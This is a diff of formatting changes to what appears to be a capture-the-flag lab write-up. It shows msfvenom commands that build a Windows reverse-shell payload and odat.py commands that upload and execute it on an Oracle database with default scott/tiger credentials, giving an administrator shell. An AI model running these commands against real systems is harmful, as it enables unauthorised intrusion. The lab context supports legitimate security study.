@@ -70,7 +70,6 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f exe -
 
 Then we can run the following commands:
 
-{% code overflow="wrap" %}
 ```
 $ ./odat.py utlfile -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --putFile \\temp rev.exe rev.exe
 
@@ -81,8 +80,7 @@ $ ./odat.py externaltable -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sys
 
 [1] (10.129.95.188:1521): Execute the rev.exe command stored in the \temp path
 ```
-{% endcode %}
 
 We would gain a reverse shell as the administrator.
 
-<figure><img src="../../../.gitbook/assets/image (3685).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3685).png>)
